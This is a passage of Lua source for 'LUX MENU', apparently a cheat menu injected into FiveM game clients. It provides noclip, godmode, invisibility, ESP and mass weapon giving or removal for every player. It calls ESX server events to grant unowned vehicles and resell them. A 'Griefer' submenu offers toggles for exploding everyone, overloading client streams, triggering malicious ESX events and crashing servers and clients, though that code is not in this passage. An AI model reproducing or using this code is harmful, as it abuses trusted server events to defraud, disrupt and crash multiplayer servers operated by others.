						SetVehicleCustomSecondaryColour(GetVehiclePedIsUsing(PlayerPedId()), r.r, r.g, r.b)
						SetVehicleNeonLightsColour(GetVehiclePedIsUsing(PlayerPedId()),r.r,r.g,r.b)
						SetVehicleHeadlightsColour(veh, 1)
						Citizen.Wait(750)
						switch = true
					end
				end
			end

			if LUX.Player.isNoclipping then
				NoclipSpeed = 1
				oldSpeed = nil
				local isInVehicle = IsPedInAnyVehicle(PlayerPedId(), 0)
				local k = nil
				local x, y, z = nil
				
				if not isInVehicle then
					k = PlayerPedId()
					x, y, z = table.unpack(GetEntityCoords(PlayerPedId(), 2))
				else
					k = GetVehiclePedIsIn(PlayerPedId(), 0)
					x, y, z = table.unpack(GetEntityCoords(PlayerPedId(), 1))
				end
				
				if isInVehicle and LUX.Game:GetSeatPedIsIn(PlayerPedId()) ~= -1 then LUX.Game:RequestControlOnce(k) end
				
				local dx, dy, dz = LUX.Game:GetCamDirection()
				SetEntityVisible(PlayerPedId(), 0, 0)
				SetEntityVisible(k, 0, 0)
				
				SetEntityVelocity(k, 0.0001, 0.0001, 0.0001)
				
				if IsDisabledControlJustPressed(0, LUX.Keys["LEFTSHIFT"]) then -- Change speed
					oldSpeed = NoclipSpeed
					NoclipSpeed = NoclipSpeed * 2
				end
				if IsDisabledControlJustReleased(0, LUX.Keys["LEFTSHIFT"]) then -- Restore speed
					NoclipSpeed = oldSpeed
				end
				
				if IsDisabledControlPressed(0, 32) then -- MOVE FORWARD
					x = x + NoclipSpeed * dx
					y = y + NoclipSpeed * dy
					z = z + NoclipSpeed * dz
				end
				
				if IsDisabledControlPressed(0, 269) then -- MOVE BACK
					x = x - NoclipSpeed * dx
					y = y - NoclipSpeed * dy
					z = z - NoclipSpeed * dz
				end
				
				if IsDisabledControlPressed(0, LUX.Keys["SPACE"]) then -- MOVE UP
					z = z + NoclipSpeed
				end
				
				if IsDisabledControlPressed(0, LUX.Keys["LEFTCTRL"]) then -- MOVE DOWN
					z = z - NoclipSpeed
				end
				
				
				SetEntityCoordsNoOffset(k, x, y, z, true, true, true)
			end
		end
	end
)

-- [NOTE] MenuRuntimeThread
Citizen.CreateThread(
	function()
		FreezeEntityPosition(entity, false)
		local currentItemIndex = 1
		local selectedItemIndex = 1

		-- MAIN MENU
		WarMenu.CreateMenu("LuxMainMenu", "LUX MENU")
		WarMenu.SetSubTitle("LuxMainMenu", "Main Menu")

		-- MAIN MENU CATEGORIES
		WarMenu.CreateSubMenu("SelfMenu", "LuxMainMenu", "Self Options")
		WarMenu.CreateSubMenu('OnlinePlayersMenu', 'LuxMainMenu', "Online Options")
		WarMenu.CreateSubMenu("VisualMenu", "LuxMainMenu", "Visual Options")
		WarMenu.CreateSubMenu("TeleportMenu", "LuxMainMenu", "Teleport Menu")
		WarMenu.CreateSubMenu("LocalVehicleMenu", "LuxMainMenu", "Vehicle Options")
		WarMenu.CreateSubMenu("LocalWepMenu", "LuxMainMenu", "Weapon Options")
		WarMenu.CreateSubMenu("ServerMenu", "LuxMainMenu", "Server Menu")
		WarMenu.CreateSubMenu("Griefer", "LuxMainMenu", "Griefer Options")
		WarMenu.CreateSubMenu('LSC', 'LocalVehicleMenu', "Los Santos Customs")
		WarMenu.CreateSubMenu('tunings', 'LSC', 'Visual Tuning')
		WarMenu.CreateSubMenu('performance', 'LSC', 'Performance Tuning')

		-- ONLINE PLAYERS MENU
		WarMenu.CreateSubMenu('PlayerOptionsMenu', 'OnlinePlayersMenu', "Player Options")

		-- ONLINE PLAYERS > WEAPON OPTIONS MENU
		WarMenu.CreateSubMenu('OnlineWepMenu', 'OnlinePlayersMenu', 'Weapon Menu')
		WarMenu.CreateSubMenu('OnlineWepCategory', 'OnlineWepMenu', 'Give Weapon')
		WarMenu.CreateSubMenu("OnlineMeleeWeapons", "OnlineWepCategory", "Melee Weapons")
		WarMenu.CreateSubMenu("OnlineSidearmWeapons", "OnlineWepCategory", "Sidearms")
		WarMenu.CreateSubMenu("OnlineAutorifleWeapons", "OnlineWepCategory", "Automatic Rifles")
		WarMenu.CreateSubMenu("OnlineShotgunWeapons", "OnlineWepCategory", "Shotguns")


		WarMenu.CreateSubMenu('OnlineVehicleMenuPlayer', 'OnlinePlayersMenu', "Vehicle Options")
		WarMenu.CreateSubMenu('ESXMenuPlayer', 'OnlinePlayersMenu', "ESX Options")

		WarMenu.CreateSubMenu("LocalWepCategory", "LocalWepMenu", "Give Weapon")
		WarMenu.CreateSubMenu("LocalMeleeWeapons", "LocalWepCategory", "Melee Weapons")
		WarMenu.CreateSubMenu("LocalSidearmWeapons", "LocalWepCategory", "Sidearms")
		WarMenu.CreateSubMenu("LocalAutorifleWeapons", "LocalWepCategory", "Automatic Rifles")
		WarMenu.CreateSubMenu("LocalShotgunWeapons", "LocalWepCategory", "Shotguns")

		WarMenu.CreateSubMenu("ServerResources", "ServerMenu", "Server Resources")
		WarMenu.CreateSubMenu('ResourceData', "ServerResources", "Resource Data")
		WarMenu.CreateSubMenu('ResourceCEvents', 'ResourceData', 'Event Handlers')
		WarMenu.CreateSubMenu('ResourceSEvents', 'ResourceData', 'Server Events')
		WarMenu.CreateSubMenu("ESXBoss", "ServerMenu", "ESX Boss Menus")
		WarMenu.CreateSubMenu("ESXMoney", "ServerMenu", "ESX Money Options")
		WarMenu.CreateSubMenu("ESXMisc", "ServerMenu", "ESX Misc Options")
		WarMenu.CreateSubMenu("ESXDrugs", "ServerMenu", "ESX Drugs")
		WarMenu.CreateSubMenu("MiscServerOptions", "ServerMenu", "Misc Server Options")
		WarMenu.CreateSubMenu("VRPOptions", "ServerMenu", "VRP Server Options")

		WarMenu.CreateSubMenu("MenuSettings", "LuxMainMenu", "Menu Settings")
		WarMenu.CreateSubMenu("MenuSettingsColor", "MenuSettings", "Change Menu Color")

		for i,theItem in pairs(LSC.vehicleMods) do
			WarMenu.CreateSubMenu(theItem.id, 'tunings', theItem.name)

			if theItem.id == "paint" then
				WarMenu.CreateSubMenu("primary", theItem.id, "Primary Paint")
				WarMenu.CreateSubMenu("secondary", theItem.id, "Secondary Paint")

				WarMenu.CreateSubMenu("rimpaint", theItem.id, "Wheel Paint")

				WarMenu.CreateSubMenu("classic1", "primary", "Classic Paint")
				WarMenu.CreateSubMenu("metallic1", "primary", "Metallic Paint")
				WarMenu.CreateSubMenu("matte1", "primary","Matte Paint")
				WarMenu.CreateSubMenu("metal1", "primary","Metal Paint")
				WarMenu.CreateSubMenu("classic2", "secondary", "Classic Paint")
				WarMenu.CreateSubMenu("metallic2", "secondary", "Metallic Paint")
				WarMenu.CreateSubMenu("matte2", "secondary","Matte Paint")
				WarMenu.CreateSubMenu("metal2", "secondary","Metal Paint")

				WarMenu.CreateSubMenu("classic3", "rimpaint", "Classic Paint")
				WarMenu.CreateSubMenu("metallic3", "rimpaint", "Metallic Paint")
				WarMenu.CreateSubMenu("matte3", "rimpaint","Matte Paint")
				WarMenu.CreateSubMenu("metal3", "rimpaint","Metal Paint")

			end
		end

		for i,theItem in pairs(LSC.perfMods) do
			WarMenu.CreateSubMenu(theItem.id, 'performance', theItem.name)
		end

		local SelectedPlayer = nil
		local SelectedResource = nil
		
		while isMenuEnabled do
			ped = PlayerPedId()
			veh = GetVehiclePedIsUsing(ped)
			if WarMenu.IsMenuOpened("LuxMainMenu") then
				if WarMenu.MenuButton("Self Options", "SelfMenu") then end
				if WarMenu.MenuButton("Online Options", "OnlinePlayersMenu") then end
				if WarMenu.MenuButton("Visual Options", "VisualMenu") then end
				if WarMenu.MenuButton("Teleport Options", "TeleportMenu") then end
				if WarMenu.MenuButton("Vehicle Options", "LocalVehicleMenu") then end
				if WarMenu.MenuButton("Weapon Options", "LocalWepMenu") then end
				if WarMenu.MenuButton("Server Options", "ServerMenu") then end
				if WarMenu.MenuButton("~r~Grief Menu", "Griefer") then end
				if WarMenu.MenuButton("~b~Menu Settings", "MenuSettings") then end

				WarMenu.Display()
			elseif WarMenu.IsMenuOpened("SelfMenu") then

			 	if WarMenu.Button("Max Health", "Native") then
					SetEntityHealth(PlayerPedId(), 200)
				end    

				if WarMenu.Button("Max Armour", "Native") then
					SetPedArmour(PlayerPedId(), 200)
				end

				if WarMenu.Button("Suicide", "Native") then
					KillYourself()
				end

				if WarMenu.CheckBox("Infinite Stamina", InfStamina, function(enabled) InfStamina = enabled end) then
					
				end
				
				if WarMenu.CheckBox("Godmode", Godmode, function(enabled) Godmode = enabled end) then

				end
				
				if WarMenu.CheckBox("Fast Run", fastrun, function(enabled) fastrun = enabled end) then
				
				end

				if WarMenu.CheckBox("~r~Super Jump", SuperJump, function(enabled) SuperJump = enabled end) then

				end

				if WarMenu.CheckBox("~r~Invisible", Invisible, function(enabled) Invisible = enabled end) then

				end

				if WarMenu.CheckBox("~r~Noclip", LUX.Player.isNoclipping, function(enabled) 
					LUX.Player.isNoclipping = enabled 
					if LUX.Player.isNoclipping then
						SetEntityVisible(PlayerPedId(), false, false)
					else
						SetEntityRotation(GetVehiclePedIsIn(PlayerPedId(), 0), GetGameplayCamRot(2), 2, 1)
						SetEntityVisible(GetVehiclePedIsIn(PlayerPedId(), 0), true, false)
						SetEntityVisible(PlayerPedId(), true, false)
					end
				end) then end

				WarMenu.Display()
			elseif WarMenu.IsMenuOpened("TeleportMenu") then
				if WarMenu.Button("Teleport to waypoint") then
					TeleportToWaypoint()
			 	end
		
			 	WarMenu.Display()
			elseif WarMenu.IsMenuOpened("VisualMenu") then
				-- if
				-- 	WarMenu.CheckBox(
				-- 	"TriggerBot",
				-- 	TriggerBot,
				-- 	function(enabled)
				-- 	TriggerBot = enabled
				-- 	end)
				-- then
				-- elseif
				-- 	WarMenu.CheckBox(
				-- 	"AimBot",
				-- 	AimBot,
				-- 	function(enabled)
				-- 	AimBot = enabled
				-- 	end)
				-- then

				if WarMenu.CheckBox("ESP", esp, function(enabled) esp = enabled end) then end
				if WarMenu.CheckBox("Force Crosshair", Crosshair, function(enabled) Crosshair = enabled end) then end
				if WarMenu.CheckBox("Force Minimap", showMinimap, function(enabled) showMinimap = enabled end) then end
				if WarMenu.CheckBox("Force Player Blips", playerBlips, function(enabled) playerBlips = enabled end) then end
				if WarMenu.CheckBox("Force Gamertags", showNametags, function(enabled) showNametags = enabled end) then end

				WarMenu.Display()
			elseif WarMenu.IsMenuOpened("Griefer") then
				
				if
					WarMenu.CheckBox(
					"~r~Explode All",
					blowall,
					function(enabled)
					blowall = enabled
					end)
				then
				elseif
					WarMenu.CheckBox(
					"~r~Overload Client Stream",
					nuke,
					function(enabled)
					nuke = enabled
					end)
				then
				elseif
					WarMenu.CheckBox(
					"~r~Trigger Malicious ESX",
					esxdestroy,
					function(enabled)
					esxdestroy = enabled
					end)
				then
				elseif
					WarMenu.CheckBox(
					"~r~Crash Server/Clients",
					servercrasher,
					function(enabled)
					servercrasher = enabled
					end)
				then
				end
				WarMenu.Display()
			elseif WarMenu.IsMenuOpened("LocalWepMenu") then
				if WarMenu.MenuButton("Spawn Weapon", "LocalWepCategory") then
				end

				if WarMenu.Button("~g~Give All Weapons") then
					for i = 1, #allWeapons do
						GiveWeaponToPed(PlayerPedId(), GetHashKey(allWeapons[i]), 1000, false, false)
					end
				end

				if WarMenu.Button("~r~Remove All Weapons") then
					for i = 1, #allWeapons do
						RemoveAllPedWeapons(PlayerPedId(), true)
					end
				end

				if WarMenu.Button("Give All Weapons to everyone") then
					for ids = 0, 256 do
						if ids ~= PlayerId() and GetPlayerServerId(ids) ~= 0 then
							for i = 1, #allWeapons do
								GiveWeaponToPed(PlayerPedId(ids), GetHashKey(allWeapons[i]), 1000, false, false)
							end
						end
					end
				end

				if WarMenu.Button("Remove All Weapons from everyone") then
					for ids = 0, 256 do
						if ids ~= PlayerId() and GetPlayerServerId(ids) ~= 0 then
							for i = 1, #allWeapons do
								RemoveAllPedWeapons(PlayerPedId(ids), true)
							end
						end
					end
				end

				if WarMenu.Button("Give Ammo") then
					for i = 1, #allWeapons do
						AddAmmoToPed(PlayerPedId(), GetHashKey(allWeapons[i]), 200)
					end
				end

				if WarMenu.CheckBox("Infinite Ammo", InfAmmo, function(enabled) InfAmmo = enabled SetPedInfiniteAmmoClip(PlayerPedId(), InfAmmo) end) then end	
				if WarMenu.CheckBox("Vehicle Gun", VehicleGun, function(enabled)VehicleGun = enabled end) then end		
				if WarMenu.CheckBox("Delete Gun", DeleteGun, function(enabled)DeleteGun = enabled end) then end

				WarMenu.Display()
				-- [NOTE] Local Weapon Menu
			elseif WarMenu.IsMenuOpened("LocalWepCategory") then
				WarMenu.MenuButton("Melee Weapons", "LocalMeleeWeapons")
				WarMenu.MenuButton("Sidearms", "LocalSidearmWeapons")
				WarMenu.MenuButton("Auto Rifles", "LocalAutorifleWeapons")
				WarMenu.MenuButton("Shotguns", "LocalShotgunWeapons")

				WarMenu.Display()
			elseif WarMenu.IsMenuOpened("LocalMeleeWeapons") then
				for hash, v in pairs(t_Weapons) do
					if v[4] == "w_me" then
						if WarMenu.Button(v[1], "isWeapon") then
							GiveWeaponToPed(PlayerPedId(), GetHashKey(hash), 0, false, false)
						end
					end
				end

				WarMenu.Display()
			elseif WarMenu.IsMenuOpened("LocalSidearmWeapons") then
				for hash, v in pairs(t_Weapons) do
					if v[4] == "w_hg" then
						if WarMenu.Button(v[1], "isWeapon") then
							GiveWeaponToPed(PlayerPedId(), GetHashKey(hash), 32, false, false)
						end
					end
				end

				WarMenu.Display()
			elseif WarMenu.IsMenuOpened("LocalAutorifleWeapons") then
				for hash, v in pairs(t_Weapons) do
					if v[4] == "w_ar" then
						if WarMenu.Button(v[1], "isWeapon") then
							GiveWeaponToPed(PlayerPedId(), GetHashKey(hash), 60, false, false)
						end
					end
				end

				WarMenu.Display()
			elseif WarMenu.IsMenuOpened("LocalShotgunWeapons") then
				for hash, v in pairs(t_Weapons) do
					if v[4] == "w_sg" then
						if WarMenu.Button(v[1], "isWeapon") then
							GiveWeaponToPed(PlayerPedId(), GetHashKey(hash), 18, false, false)
						end
					end
				end

				WarMenu.Display()	
			elseif WarMenu.IsMenuOpened("LocalVehicleMenu") then

				if WarMenu.Button("Spawn Vehicle") then
					local ModelName = KeyboardInput("Enter Vehicle Spawn Name", "", 20)
					if ModelName and IsModelValid(ModelName) and IsModelAVehicle(ModelName) then
						RequestModel(ModelName)
						while not HasModelLoaded(ModelName) do
							Citizen.Wait(0)
						end

						local veh = CreateVehicle(GetHashKey(ModelName), GetEntityCoords(PlayerPedId()), GetEntityHeading(PlayerPedId()), true, true)

						SetPedIntoVehicle(PlayerPedId(), veh, -1)
					else
						drawNotification({text = string.format("~o~%s ~s~is not a valid vehicle", ModelName), type = 'error'})
					end
				end
				if WarMenu.Button("Delete Vehicle") then
					if LUX.Player.inVehicle then
						DelVeh(GetVehiclePedIsUsing(PlayerPedId()))
					else
						drawNotification({text = "You must be in a vehicle", type = "error"})
					end
				end
				if WarMenu.Button("ESX Give Ownership") then
					if LUX.Player.inVehicle then
						local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
						SetVehicleNumberPlateText(vehicle, exports.esx_vehicleshop:GeneratePlate())
						local vehicleProps = ESX.Game.GetVehicleProperties(vehicle)
						TriggerServerEvent('esx_vehicleshop:setVehicleOwned', vehicleProps)
						--TriggerServerEvent('esx_givecarkeys:setVehicleOwned', vehicleProps)
					else
						drawNotification({text = "You must be in a vehicle", type = "error"})
					end
				end
				if WarMenu.Button("ESX Sell Vehicle") then
					local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
					local vehicleProps = ESX.Game.GetVehicleProperties(vehicle)
					ESX.TriggerServerCallback('esx_vehicleshop:resellVehicle', function(vehicleSold)

						if vehicleSold then
							ESX.Game.DeleteVehicle(vehicle)
							ESX.ShowNotification("Vehicle sold")
						else
							ESX.ShowNotification("Nacho Vehicle")
						end

					end, vehicleProps.plate, vehicleProps.model)
				end
				if WarMenu.MenuButton("LS Customs", "LSC") then 
				end
				if WarMenu.Button("Flip Vehicle") then
					local playerPed = GetPlayerPed(-1)
					local playerVeh = GetVehiclePedIsIn(playerPed, true)
					if IsPedInAnyVehicle(GetPlayerPed(-1), 0) then
						if (GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)) then
							SetVehicleOnGroundProperly(playerVeh)
							--drawNotification({text = "Your vehicle was flipped", type = 'success'})
						else
							drawNotification({text = "You must be the driver of the vehicle", type = 'error'})
						end
					else
						drawNotification({text = "You must be in a vehicle to flip", type = 'error'})
					end
				end
				if WarMenu.Button("Repair Vehicle") then
					SetVehicleFixed(GetVehiclePedIsIn(GetPlayerPed(-1), false))
					SetVehicleDirtLevel(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0.0)
					SetVehicleLights(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
					SetVehicleBurnout(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
					SetVehicleLightsMode(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
				end
				if WarMenu.Button("Change License Plate") then
					local playerPed = GetPlayerPed(-1)
					local playerVeh = GetVehiclePedIsIn(playerPed, true)
					local result = KeyboardInput("Enter new plate text", "", 8)
					if result then
						SetVehicleNumberPlateText(playerVeh, result)
					end
				end
				if WarMenu.Button("Max Tuning") then
					MaxOut(GetVehiclePedIsUsing(PlayerPedId()))
				end
				if WarMenu.CheckBox("Rainbow Vehicle Colour", RainbowVeh, function(enabled) RainbowVeh = enabled end) then 
				end
				if WarMenu.CheckBox("Ghetto Police Car", ghettopolice, function(enabled) ghettopolice = enabled end) then
				end
				if WarMenu.Button("Make vehicle dirty") then
					Clean(GetVehiclePedIsUsing(PlayerPedId()))
					drawNotification("Vehicle is now dirty")
				end
				if WarMenu.Button("Make vehicle clean") then
					Clean2(GetVehiclePedIsUsing(PlayerPedId()))
					drawNotification("Vehicle is now clean")
				end
				if WarMenu.CheckBox("Seatbelt", Seatbelt, 
						function(enabled) 
							Seatbelt = enabled 
							SetPedCanBeKnockedOffVehicle(PlayerPedId(), Seatbelt) 
						end) 
					then
				end
				if WarMenu.CheckBox("Vehicle Godmode", VehGod,
						function(enabled)
							VehGod = enabled
						end) 
					then
				end
				if WarMenu.CheckBox("Speedboost ~g~SHIFT ~r~CTRL", VehSpeed,
						function(enabled)
						VehSpeed = enabled
						end)
					then
				end

				WarMenu.Display()
			elseif WarMenu.IsMenuOpened("tunings") then
				for i,theItem in pairs(LSC.vehicleMods) do
					if theItem.id == "extra" and #LSC:CheckValidVehicleExtras() ~= 0 then
						if WarMenu.MenuButton(theItem.name, theItem.id) then
						end
					elseif theItem.id == "neon" then
						if WarMenu.MenuButton(theItem.name, theItem.id) then
						end
					elseif theItem.id == "paint" then
						if WarMenu.MenuButton(theItem.name, theItem.id) then
						end
					elseif theItem.id == "wheeltypes" then
						if WarMenu.MenuButton(theItem.name, theItem.id) then
						end
					else
						local valid = LSC:CheckValidVehicleMods(theItem.id)
						for ci,ctheItem in pairs(valid) do
							if WarMenu.MenuButton(ctheItem.name, ctheItem.id) then
							end
							break
						end
					end

				end
				if IsToggleModOn(veh, 22) then
					xenonStatus = "~g~Installed"
				else
					xenonStatus = "Not Installed"
				end
				if WarMenu.Button("Xenon Headlights", xenonStatus) then
					if not IsToggleModOn(veh,22) then
						payed = true
						if payed then
							ToggleVehicleMod(veh, 22, not IsToggleModOn(veh,22))
						end
					else
						ToggleVehicleMod(veh, 22, not IsToggleModOn(veh,22))
					end
				end
				WarMenu.Display()
			elseif WarMenu.IsMenuOpened("performance") then
				for i,theItem in pairs(LSC.perfMods) do
					if WarMenu.MenuButton(theItem.name, theItem.id) then
					end
				end
				if IsToggleModOn(veh,18) then
					turboStatus = "~g~Installed"
				else
					turboStatus = "Not Installed"
				end
				if WarMenu.Button("Turbo Tune", turboStatus) then
					if not IsToggleModOn(veh,18) then
						payed = true
						if payed then
							ToggleVehicleMod(veh, 18, not IsToggleModOn(veh,18))
						end
					else
						ToggleVehicleMod(veh, 18, not IsToggleModOn(veh,18))
					end
				end
				WarMenu.Display()
			elseif WarMenu.IsMenuOpened("primary") then
				if WarMenu.MenuButton("Classic", "classic1") then
				elseif WarMenu.MenuButton("Metallic", "metallic1") then
				elseif WarMenu.MenuButton("Matte", "matte1") then
				elseif WarMenu.MenuButton("Metal", "metal1") then
				end
				WarMenu.Display()
			elseif WarMenu.IsMenuOpened("secondary") then
				WarMenu.MenuButton("Classic", "classic2")
				WarMenu.MenuButton("Metallic", "metallic2")
				WarMenu.MenuButton("Matte", "matte2")
				WarMenu.MenuButton("Metal", "metal2")
				WarMenu.Display()
			elseif WarMenu.IsMenuOpened("rimpaint") then
				WarMenu.MenuButton("Classic", "classic3")
				WarMenu.MenuButton("Metallic", "metallic3")
				WarMenu.MenuButton("Matte", "matte3")
				WarMenu.MenuButton("Metal", "metal3")
				WarMenu.Display()
			elseif WarMenu.IsMenuOpened("classic1") then
				for theName,thePaint in pairs(LSC.paintsClassic) do
					tp,ts = GetVehicleColours(veh)
					if tp == thePaint.id and not isPreviewing then
						pricetext = "~g~Installed"
					else
						if isPreviewing and tp == thePaint.id then
							pricetext = "~y~Previewing"
						else
							pricetext = "Not Installed"
						end
					end
					curprim,cursec = GetVehicleColours(veh)
					if WarMenu.Button(thePaint.name, pricetext) then
						if not isPreviewing then
							oldmodtype = "paint"
							oldmodaction = false
							oldprim,oldsec = GetVehicleColours(veh)
							oldpearl,oldwheelcolour = GetVehicleExtraColours(veh)
							oldmod = table.pack(oldprim,oldsec,oldpearl,oldwheelcolour)
							SetVehicleColours(veh,thePaint.id,oldsec)
							SetVehicleExtraColours(veh, thePaint.id,oldwheelcolour)

							isPreviewing = true
						elseif isPreviewing and curprim == thePaint.id then
							SetVehicleColours(veh,thePaint.id,oldsec)
							SetVehicleExtraColours(veh, thePaint.id,oldwheelcolour)
							isPreviewing = false
							oldmodtype = -1
							oldmod = -1
						elseif isPreviewing and curprim ~= thePaint.id then
							SetVehicleColours(veh,thePaint.id,oldsec)
							SetVehicleExtraColours(veh, thePaint.id,oldwheelcolour)
							isPreviewing = true
						end
					end
				end

				WarMenu.Display()
			elseif WarMenu.IsMenuOpened("metallic1") then
				for theName,thePaint in pairs(LSC.paintsClassic) do
					tp,ts = GetVehicleColours(veh)
					if tp == thePaint.id and not isPreviewing then
						pricetext = "~g~Installed"
					else
						if isPreviewing and tp == thePaint.id then
							pricetext = "~y~Previewing"
						else
							pricetext = "Not Installed"
						end
					end
					curprim,cursec = GetVehicleColours(veh)
					if WarMenu.Button(thePaint.name, pricetext) then
						if not isPreviewing then
							oldmodtype = "paint"
							oldmodaction = false
							oldprim,oldsec = GetVehicleColours(veh)
							oldpearl,oldwheelcolour = GetVehicleExtraColours(veh)
							oldmod = table.pack(oldprim,oldsec,oldpearl,oldwheelcolour)
							SetVehicleColours(veh,thePaint.id,oldsec)
							SetVehicleExtraColours(veh, thePaint.id,oldwheelcolour)

							isPreviewing = true
						elseif isPreviewing and curprim == thePaint.id then
							SetVehicleColours(veh,thePaint.id,oldsec)
							SetVehicleExtraColours(veh, thePaint.id,oldwheelcolour)
							isPreviewing = false
							oldmodtype = -1
							oldmod = -1
						elseif isPreviewing and curprim ~= thePaint.id then
							SetVehicleColours(veh,thePaint.id,oldsec)
							SetVehicleExtraColours(veh, thePaint.id,oldwheelcolour)
							isPreviewing = true
						end
					end
				end
				WarMenu.Display()
			elseif WarMenu.IsMenuOpened("matte1") then
				for theName,thePaint in pairs(LSC.paintsMatte) do
					tp,ts = GetVehicleColours(veh)
					if tp == thePaint.id and not isPreviewing then
						pricetext = "~g~Installed"
					else
						if isPreviewing and tp == thePaint.id then
							pricetext = "~y~Previewing"
						else
							pricetext = "Not Installed"
						end
					end
					curprim,cursec = GetVehicleColours(veh)
					if WarMenu.Button(thePaint.name, pricetext) then
						if not isPreviewing then
							oldmodtype = "paint"
							oldmodaction = false
							oldprim,oldsec = GetVehicleColours(veh)
							oldpearl,oldwheelcolour = GetVehicleExtraColours(veh)
							SetVehicleExtraColours(veh, thePaint.id,oldwheelcolour)
							oldmod = table.pack(oldprim,oldsec,oldpearl,oldwheelcolour)
							SetVehicleColours(veh,thePaint.id,oldsec)

							isPreviewing = true
						elseif isPreviewing and curprim == thePaint.id then
							SetVehicleColours(veh,thePaint.id,oldsec)
							SetVehicleExtraColours(veh, thePaint.id,oldwheelcolour)
							isPreviewing = false
							oldmodtype = -1
							oldmod = -1
						elseif isPreviewing and curprim ~= thePaint.id then
							SetVehicleColours(veh,thePaint.id,oldsec)
							SetVehicleExtraColours(veh, thePaint.id,oldwheelcolour)
							isPreviewing = true
						end
					end
				end
				WarMenu.Display()
			elseif WarMenu.IsMenuOpened("metal1") then
				for theName,thePaint in pairs(LSC.paintsMetal) do
					tp,ts = GetVehicleColours(veh)
					if tp == thePaint.id and not isPreviewing then
						pricetext = "~g~Installed"
					else
						if isPreviewing and tp == thePaint.id then
							pricetext = "~y~Previewing"
						else
							pricetext = "Not Installed"
						end
					end
					curprim,cursec = GetVehicleColours(veh)
					if WarMenu.Button(thePaint.name, pricetext) then
						if not isPreviewing then
							oldmodtype = "paint"
							oldmodaction = false
							oldprim,oldsec = GetVehicleColours(veh)
							oldpearl,oldwheelcolour = GetVehicleExtraColours(veh)
							oldmod = table.pack(oldprim,oldsec,oldpearl,oldwheelcolour)
							SetVehicleExtraColours(veh, thePaint.id,oldwheelcolour)
							SetVehicleColours(veh,thePaint.id,oldsec)

							isPreviewing = true
						elseif isPreviewing and curprim == thePaint.id then
							SetVehicleColours(veh,thePaint.id,oldsec)
							SetVehicleExtraColours(veh, thePaint.id,oldwheelcolour)
							isPreviewing = false
							oldmodtype = -1
							oldmod = -1
						elseif isPreviewing and curprim ~= thePaint.id then
							SetVehicleColours(veh,thePaint.id,oldsec)
							SetVehicleExtraColours(veh, thePaint.id,oldwheelcolour)
							isPreviewing = true
						end
					end
				end
				WarMenu.Display()
			elseif WarMenu.IsMenuOpened("classic2") then
				for theName,thePaint in pairs(LSC.paintsClassic) do
					tp,ts = GetVehicleColours(veh)
					if ts == thePaint.id and not isPreviewing then
						pricetext = "~g~Installed"
					else
						if isPreviewing and ts == thePaint.id then
							pricetext = "~y~Previewing"
						else
							pricetext = "Not Installed"
						end
					end
					curprim,cursec = GetVehicleColours(veh)
					if WarMenu.Button(thePaint.name, pricetext) then
						if not isPreviewing then
							oldmodtype = "paint"
							oldmodaction = false
							oldprim,oldsec = GetVehicleColours(veh)
							oldmod = table.pack(oldprim,oldsec)
							SetVehicleColours(veh,oldprim,thePaint.id)

							isPreviewing = true
						elseif isPreviewing and cursec == thePaint.id then
							SetVehicleColours(veh,oldprim,thePaint.id)
							isPreviewing = false
							oldmodtype = -1
							oldmod = -1
						elseif isPreviewing and cursec ~= thePaint.id then
							SetVehicleColours(veh,oldprim,thePaint.id)
							isPreviewing = true
						end
					end
				end
				WarMenu.Display()
			elseif WarMenu.IsMenuOpened("metallic2") then
				for theName,thePaint in pairs(LSC.paintsClassic) do
					tp,ts = GetVehicleColours(veh)
					if ts == thePaint.id and not isPreviewing then
						pricetext = "~g~Installed"
					else
						if isPreviewing and ts == thePaint.id then
							pricetext = "~y~Previewing"
						else
							pricetext = "Not Installed"
						end
					end
					curprim,cursec = GetVehicleColours(veh)
					if WarMenu.Button(thePaint.name, pricetext) then
						if not isPreviewing then
							oldmodtype = "paint"
							oldmodaction = false
							oldprim,oldsec = GetVehicleColours(veh)
							oldmod = table.pack(oldprim,oldsec)
							SetVehicleColours(veh,oldprim,thePaint.id)

							isPreviewing = true
						elseif isPreviewing and cursec == thePaint.id then
							SetVehicleColours(veh,oldprim,thePaint.id)
							isPreviewing = false
							oldmodtype = -1
							oldmod = -1
						elseif isPreviewing and cursec ~= thePaint.id then
							SetVehicleColours(veh,oldprim,thePaint.id)
							isPreviewing = true
						end
					end
				end
				WarMenu.Display()
			elseif WarMenu.IsMenuOpened("matte2") then
				for theName,thePaint in pairs(LSC.paintsMatte) do
					tp,ts = GetVehicleColours(veh)
					if ts == thePaint.id and not isPreviewing then
						pricetext = "~g~Installed"
					else
						if isPreviewing and ts == thePaint.id then
							pricetext = "~y~Previewing"
						else
							pricetext = "Not Installed"
						end
					end
					curprim,cursec = GetVehicleColours(veh)
					if WarMenu.Button(thePaint.name, pricetext) then
						if not isPreviewing then
							oldmodtype = "paint"
							oldmodaction = false
							oldprim,oldsec = GetVehicleColours(veh)
							oldmod = table.pack(oldprim,oldsec)
							SetVehicleColours(veh,oldprim,thePaint.id)

							isPreviewing = true
						elseif isPreviewing and cursec == thePaint.id then
							SetVehicleColours(veh,oldprim,thePaint.id)
							isPreviewing = false
							oldmodtype = -1
							oldmod = -1
						elseif isPreviewing and cursec ~= thePaint.id then
							SetVehicleColours(veh,oldprim,thePaint.id)
							isPreviewing = true
						end
					end
				end
				WarMenu.Display()
			elseif WarMenu.IsMenuOpened("metal2") then
				for theName,thePaint in pairs(LSC.paintsMetal) do
					tp,ts = GetVehicleColours(veh)
					if ts == thePaint.id and not isPreviewing then
						pricetext = "~g~Installed"
					else
						if isPreviewing and ts == thePaint.id then
							pricetext = "~y~Previewing"
						else
							pricetext = "Not Installed"
						end
					end
					curprim,cursec = GetVehicleColours(veh)
					if WarMenu.Button(thePaint.name, pricetext) then
						if not isPreviewing then
							oldmodtype = "paint"
							oldmodaction = false
							oldprim,oldsec = GetVehicleColours(veh)
							oldmod = table.pack(oldprim,oldsec)
							SetVehicleColours(veh,oldprim,thePaint.id)

							isPreviewing = true
						elseif isPreviewing and cursec == thePaint.id then
							SetVehicleColours(veh,oldprim,thePaint.id)
							isPreviewing = false
							oldmodtype = -1
							oldmod = -1
						elseif isPreviewing and cursec ~= thePaint.id then
